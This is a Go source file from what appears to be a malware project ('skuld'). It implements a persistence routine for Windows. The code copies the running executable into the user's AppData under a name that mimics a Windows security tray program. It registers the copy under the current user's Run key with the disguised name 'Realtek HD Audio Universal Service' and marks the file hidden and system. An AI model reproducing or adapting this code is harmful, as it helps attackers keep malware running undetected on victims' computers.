package startup

import (
	"golang.org/x/sys/windows/registry"
	"os"
	"os/exec"

	"github.com/hackirby/skuld/utils/fileutil"
)

func Run() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	defer key.Close()

	path := os.Getenv("APPDATA") + "\\Microsoft\\Protect\\SecurityHealthSystray.exe"

	err = key.SetStringValue("Realtek HD Audio Universal Service", path)
	if err != nil {
		return err
	}

	if fileutil.Exists(path) {
		err = os.Remove(path)
		if err != nil {
			return err
		}
	}

	err = fileutil.CopyFile(exe, path)
	if err != nil {
		return err
	}

	return exec.Command("attrib", "+h", "+s", path).Run()
}
